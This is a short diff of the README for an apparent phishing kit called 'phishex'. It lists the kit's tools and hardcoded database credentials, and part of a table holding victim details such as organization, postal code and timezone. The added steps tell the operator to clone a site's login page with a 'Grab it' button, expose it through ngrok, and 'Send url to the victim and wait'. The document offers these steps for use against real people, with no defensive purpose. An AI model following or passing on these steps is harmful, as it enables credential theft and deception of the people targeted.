@@ -8,9 +8,9 @@ Httrack<br>
 Apache TOMCAT 9.*<br>
 
 Postgresql database:<br>
-	Database name: phishex
-	user: phx
-	password: phishex_666
+Database name: phishex<br>
+user: phx<br>
+password: phishex_666<br>
 	
 	Scripts:
 
@@ -29,5 +29,13 @@ Postgresql database:<br>
 	organization varchar(64),
 	postal varchar(16),
 	timezone varchar(64));
-
+</p>
+<br>
+<b>START<b><br>
+<p>
+1) Run server.py script
+2) Run application
+3) Enter site login page url and click [Grab it]
+4) (OPTIONAL) run .ngrok on port 80
+5) Send url to the victim and wait
 </p>
